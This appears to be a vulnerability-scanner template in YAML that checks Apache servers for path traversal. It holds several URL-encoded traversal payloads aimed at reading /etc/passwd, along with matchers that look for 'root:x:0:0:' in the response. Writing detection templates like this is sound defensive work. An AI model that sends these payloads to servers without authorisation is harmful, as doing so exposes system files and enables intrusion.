id: apache-path-traversal-check
info:
  author: Zahir
  description: 'Detects Apache path traversal vulnerabilities using various payloads
    to access sensitive files like `/etc/passwd`.

    '
  name: Apache Path Traversal Vulnerability
  severity: high
  tags: apache, path-traversal, lfi, sensitive-data
requests:
- matchers:
  - status:
    - 200
    type: status
  - part: body
    type: word
    words:
    - 'root:x:0:0:'
    - /bin/bash
    - /bin/sh
    - /home/
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}{{payloads}}'
variables:
  payloads: '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

    //cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

    /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

    /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd

    '
